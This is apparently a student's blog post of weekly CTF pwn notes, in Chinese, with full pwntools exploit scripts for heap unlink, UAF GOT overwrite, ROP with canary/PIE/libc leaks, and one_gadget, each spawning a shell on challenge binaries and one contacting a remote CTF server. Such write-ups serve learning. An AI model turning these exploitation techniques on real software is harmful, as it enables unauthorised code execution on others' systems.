<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>third week | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="感觉上周跑得太快了,好多知识没完全消化,这周就总结吧~~~(不是偷懒啊 off by one这种 off by one 的洞有好多方法,如堆块重叠和 unlink ,这里先记录一下 unlink 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *p &#x3D; pr">
<meta property="og:type" content="article">
<meta property="og:title" content="third week">
<meta property="og:url" content="http://example.com/2019/10/21/2019-10-21-3rd_week/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="感觉上周跑得太快了,好多知识没完全消化,这周就总结吧~~~(不是偷懒啊 off by one这种 off by one 的洞有好多方法,如堆块重叠和 unlink ,这里先记录一下 unlink 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *p &#x3D; pr">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2019-10-20T16:00:00.000Z">
<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-2019-10-21-3rd_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/21/2019-10-21-3rd_week/" class="article-date">
  <time class="dt-published" datetime="2019-10-20T16:00:00.000Z" itemprop="datePublished">2019-10-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      third week
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>感觉上周跑得太快了,好多知识没完全消化,这周就总结吧~~~(不是偷懒啊</p>
<h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h2><p>这种 off by one 的洞有好多方法,如堆块重叠和 unlink ,这里先记录一下 unlink</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(ind,size,content):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">	p.sendlineafter(&#x27;size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line">new(2,0xf8,&quot;/bin/sh&quot;)</span><br><span class="line">new(32,0xf8,&quot;32&quot;)</span><br><span class="line">new(31,0xf8,&quot;31&quot;)</span><br><span class="line">new(30,0xf8,&quot;30&quot;)#unlink spy</span><br><span class="line">pay = p64(0)+p64(0xf1)+p64(0x6021c8)+p64(0x6021c8+8)</span><br><span class="line">pay = pay.ljust(0xf0)</span><br><span class="line">pay+=p64(0xf0)</span><br><span class="line">edit(32,pay)</span><br><span class="line">free(31)#unlink</span><br><span class="line">payload = p64(0x6021c8)*3+p64(elf.got[&#x27;free&#x27;])</span><br><span class="line">payload = payload.ljust(0xf0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">edit(32,payload)</span><br><span class="line">p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;index&#x27;,&#x27;32&#x27;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - libc.symbols[&#x27;free&#x27;]</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">pay = &#x27;a&#x27;*0x18+p64(free_hook)</span><br><span class="line">pay = pay.ljust(0xf0)</span><br><span class="line">pay += p64(1)</span><br><span class="line">edit(30,pay)</span><br><span class="line">edit(32,p64(system))</span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="万能-gadget"><a href="#万能-gadget" class="headerlink" title="万能 gadget"></a>万能 gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&#x27;aaaabaaacaaadaaa&#x27;+p64(0x4004ed))</span><br><span class="line">leak = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))-0x118</span><br><span class="line">pay = &quot;/bin//sh\x00&quot;.ljust(0x10,&quot;\x00&quot;)</span><br><span class="line">header = 0x040059A</span><br><span class="line">waist = 0x400580</span><br><span class="line">pop_rdi = 0x4005a3</span><br><span class="line">rax_3B = 0x4004e2</span><br><span class="line">syscall = 0x400517</span><br><span class="line">pay+= p64(header)+p64(10)+p64(0)+p64(leak)+p64(0)*3+p64(waist)</span><br><span class="line">pay+=p64(rax_3B)+p64(pop_rdi)+p64(leak)+p64(syscall)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这个发现师傅的 wp 写的 0x4004e2 差了一个字节,结果也能用~~~ 什么鬼,中间还出现一个很迷的 bug ,始终不通,最后发现一开始的 ret 我填的 main_addr ,(狗头)</p>
<h2 id="最强-rop"><a href="#最强-rop" class="headerlink" title="最强 rop"></a>最强 rop</h2><blockquote>
<p>栈迁移是迁移到 buf 内部.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">    pause()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">bin_elf = &quot;./pwn&quot;</span><br><span class="line">elf = ELF(bin_elf)</span><br><span class="line">context.binary=bin_elf</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(bin_elf, aslr=0)</span><br><span class="line">ru(&quot;please input your name\n&quot;)</span><br><span class="line">sl(&#x27;aeojj&#x27;)</span><br><span class="line">ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line">sd(&quot;a&quot;*0x19)</span><br><span class="line"></span><br><span class="line">ru(&quot;a&quot;*0x18)</span><br><span class="line">canary = u64(p.recv(8))-0x61</span><br><span class="line">stack = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x28</span><br><span class="line">msg(&quot;canary&quot;,canary)</span><br><span class="line">msg(&quot;stack&quot;,stack)</span><br><span class="line">ru(&quot;OK???\n&quot;)</span><br><span class="line">sd(&quot;b&quot;*8)</span><br><span class="line">ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line"></span><br><span class="line">pay = &quot;c&quot;*0x28+p64(canary)+&quot;a&quot;*8+&quot;\xde\x50&quot;#1/16</span><br><span class="line"></span><br><span class="line">sd(pay)</span><br><span class="line"></span><br><span class="line">ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line">sd(&quot;x&quot;*8)</span><br><span class="line">ru(&quot;OK???\n&quot;)</span><br><span class="line">sd(&quot;b&quot;*0x29)</span><br><span class="line"></span><br><span class="line">ru(&quot;a&quot;*8)</span><br><span class="line">piebase = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x1440</span><br><span class="line">msg(&quot;piebase&quot;,piebase)</span><br><span class="line">printf_got=elf.got[&quot;printf&quot;]+piebase</span><br><span class="line">printf_plt=elf.plt[&quot;printf&quot;]+piebase</span><br><span class="line">read_got=elf.got[&quot;read&quot;]+piebase</span><br><span class="line">pop_rdi_ret=piebase+0x14a3</span><br><span class="line">leave_ret=piebase+0x10dc</span><br><span class="line">vul = piebase+0x10de</span><br><span class="line">ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">gadget = &quot;a&quot;*0x8+p64(pop_rdi_ret)+p64(read_got)+p64(printf_plt)</span><br><span class="line">pay = gadget+p64(vul)+p64(canary)+p64(stack)+p64(leave_ret)</span><br><span class="line">sd(pay)</span><br><span class="line">libc.address = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-libc.sym[&quot;read&quot;]</span><br><span class="line">system = libc.sym[&quot;system&quot;]</span><br><span class="line">msg(&quot;libc.address&quot;,libc.address)</span><br><span class="line">ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line">sd(&quot;d&quot;*0x8)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">ru(&quot;OK???\n&quot;)</span><br><span class="line">sd(&quot;e&quot;*0x8)</span><br><span class="line"></span><br><span class="line">ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">gadget = &quot;/bin/sh\x00&quot;+p64(pop_rdi_ret)+p64(stack)+p64(system)</span><br><span class="line">pay = gadget+p64(0)+p64(canary)+p64(stack-0x10)+p64(leave_ret)</span><br><span class="line">sd(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这是我做过最难的 rop 了,必须泄漏四个( canary stack libc pie),太恶心了,不过思路还是很清楚的,我试试优化一下,最后我感觉师傅写错了,但是 exp 却能用,又迷了~~~~ 而且感觉师傅走了好多弯路啊，一般情况不应该跑三遍啊~~</p>
<p>下面说一下我的方法, one_gadget 一步 getshell ,就不用师父的模板了,实在使不顺手,不过师傅的 gdb 函数是真的牛逼~~简单记录一下我的思路（厚颜无耻</p>
<p>在 16.04 测得，很巧，栈上有残留的东西正好泄露出来 libc 基址，之后也用上了第二次输入把 canary 整出来了，理论上 pie 和 stack 都不用泄露了，可是 one_gadget 就是不好用，我想了几个方案不是要泄露 stack 地址就是不满足，什么鬼，只能用师傅的方法</p>
<p>崩溃了，我想了好久我这个 one_gadget 已经很无敌了，而且我动态调的时候很明显成功了，怎么回事？最后发现是根本没 send 出去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&#x27;./babypwn&#x27;,aslr=0)</span><br><span class="line">elf = ELF(&quot;./babypwn&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p.recvuntil(&#x27;name\n&#x27;)</span><br><span class="line">p.sendline(&#x27;aeojj&#x27;)</span><br><span class="line">p.recvuntil(&#x27;???\n&#x27;)</span><br><span class="line">p.send(&#x27;a&#x27;*8)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*8)</span><br><span class="line">libc = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-458676</span><br><span class="line">print hex(libc)</span><br><span class="line">p.recvuntil(&#x27;???\n&#x27;)</span><br><span class="line">p.send(&#x27;b&#x27;*0x19)</span><br><span class="line">p.recvuntil(&#x27;b&#x27;*0x18)</span><br><span class="line">canary = u64(p.recv(8))-0x62</span><br><span class="line">print hex(canary)</span><br><span class="line">p.recvuntil(&quot;I think you can do something now\n&quot;)</span><br><span class="line">one = libc+0x4526a</span><br><span class="line">pay = &quot;c&quot;*0x28+p64(canary)+&quot;a&quot;*8+p64(one)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功了，真的爽，感觉是一个非预期解（18.04失败了，栈很干净，23333），开心~~~ 在这里想到一个好方法，就是打一个 patch ，然后去打，如果 patch 过的文件还是过不了检测就该想想是哪的问题了~~</p>
<h2 id="noleakinfo"><a href="#noleakinfo" class="headerlink" title="noleakinfo"></a>noleakinfo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = process(&#x27;./noinfoleak&#x27;)</span><br><span class="line">elf = ELF(&#x27;noinfoleak&#x27;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def add(size, data):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(size))</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, data)</span><br><span class="line">def delete(index):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(index))</span><br><span class="line">def edit(index, data):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(index))</span><br><span class="line">    r.sendafter(&#x27;&gt;&#x27;, data)</span><br><span class="line"></span><br><span class="line">add(0x30, &#x27;/bin/sh&#x27;)</span><br><span class="line">add(0x20, &#x27;AAA&#x27;)</span><br><span class="line">add(0x20, &#x27;BBB&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">arrAddr = 0x06010A0</span><br><span class="line">freeGotAddr = elf.got[&#x27;free&#x27;]</span><br><span class="line">putsPltAddr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">putsGotAddr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">add(0x20, p64(arrAddr))</span><br><span class="line">add(0x20, &#x27;second&#x27;)</span><br><span class="line">add(0x20, &#x27;first&#x27;)</span><br><span class="line"># new chunk will allocate in arrAddr</span><br><span class="line"># save new chunk data&#x27;s addr in arrAddr[6 * 2]</span><br><span class="line"># overwrite arrAddr[1]&#x27;s content to free@got</span><br><span class="line">add(0x20, p64(freeGotAddr))</span><br><span class="line"># overwrite free@got to puts@plt</span><br><span class="line">edit(1, p64(putsPltAddr))</span><br><span class="line"># overwrite arrAddr[1]&#x27;s content to puts@got</span><br><span class="line">edit(6, p64(putsGotAddr))</span><br><span class="line"># trigger free()(puts@plt) to leak putsAddr</span><br><span class="line">delete(1)</span><br><span class="line">LeakStr = r.recvuntil(&#x27;\n&#x27;, drop=True)</span><br><span class="line">libcBaseAddr = u64(LeakStr.ljust(8, &#x27;\x00&#x27;)) - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">systemAddr = libcBaseAddr + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">print(&#x27;libc base address: 0x%x&#x27; % libcBaseAddr)</span><br><span class="line">print(&#x27;systemAdd address: 0x%x&#x27; % systemAddr)</span><br><span class="line"># overwrite arrAddr[1] to free@got</span><br><span class="line">edit(6, p64(freeGotAddr))</span><br><span class="line"># overwrite free@got to system</span><br><span class="line">edit(1, p64(systemAddr))</span><br><span class="line">delete(0)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>西湖论剑的题,我觉得 wp 太妙了,我们深入分析一下,觉得这个 wp 是件艺术品</p>
<p>首先漏洞来自</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v0 &gt;= 0 &amp;&amp; v0 &lt;= 15 )</span><br><span class="line">  free(qword_6010A0[2 * v0]);    </span><br></pre></td></tr></table></figure>

<p>这个 UAF 很爽,有这个洞基本完蛋了这个程序,但是没有 leak 函数,需要自己想方法去 leak ,这里师傅就想到了改 got ,说实话,如果是我的话,我就不敢了,因为感觉副作用太大,直接修改 free 和 malloc 有点虎,但是师傅艺高人胆大,直接利用这个通杀了, 6666666</p>
<p>基本 wp 分 3 步</p>
<ul>
<li>7 步杀人, malloc 到 bss 段,控制指针</li>
<li>修改 free_got 为 puts_got</li>
<li>修改 free_got 为 system 进而触发</li>
</ul>
<p>其实这个 got plt 还卡了我很久,现在写一下心得(早就忘了延迟绑定了,还得再学一遍),首先未调用函数前<code>got -&gt; plt -&gt; 指令</code>,调用函数后<code>got -&gt; so 真正位置</code>差不多是这样的,之前都理解的有点偏差</p>
<p>所以本次 wp 的两次修改,首先第一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x20, p64(freeGotAddr))#1</span><br><span class="line">edit(1, p64(putsPltAddr))</span><br><span class="line">edit(6, p64(putsGotAddr))</span><br><span class="line">delete(1)</span><br></pre></td></tr></table></figure>

<p>就是先把 1 指向的 free_got 改为 puts_plt ,听上去不可思议,事实上确实如此,因为 free 函数早已调用,上边写的就是 so 的偏移,之后把 1 的指向修改为 put_got ,这就是调用后的了, so 真正位置就出来了,太鸡儿妙了~~~</p>
<p>第二次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(6, p64(freeGotAddr))</span><br><span class="line">edit(1, p64(systemAddr))</span><br><span class="line">delete(0)</span><br></pre></td></tr></table></figure>

<p>就是把 free_got 改成 system_so_addr 了,理所应当</p>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><blockquote>
<p>unctf 栈溢出</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&#x27;101.71.29.5&#x27;,10052)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(content):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Plz input content: &#x27;,content)</span><br><span class="line">def edit(ind,size,content):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Plz input index: &#x27;,str(ind))</span><br><span class="line">	p.sendlineafter(&#x27;Plz input size: &#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;Plz input content: &#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Plz input index: &#x27;,str(ind))</span><br><span class="line">new(&#x27;a&#x27;*1)</span><br><span class="line">edit(0,24,&#x27;a&#x27;*24)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*24)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - 456336</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;.ljust(0x18)+p64(system)</span><br><span class="line">edit(0,0x20,payload)</span><br><span class="line">show(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>做着题傻了，一看这么简单，就是一个数据结构瞎放东西，还有溢出。然后我竟然想着到 malloc_hook 和 free_hook 地方，什么鬼，发现一个堆块解决所有问题~~ 做题还是太直，难受</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/21/2019-10-21-3rd_week/" data-id="cuidUzF0iH3--b9Y1vUhwzKNJ" data-title="third week" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/10/28/2019-10-28-4th_week/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          forth week
        
      </div>
    </a>
  
  
    <a href="/2019/10/20/2019-10-20-one_gadget/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">One_gadget</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
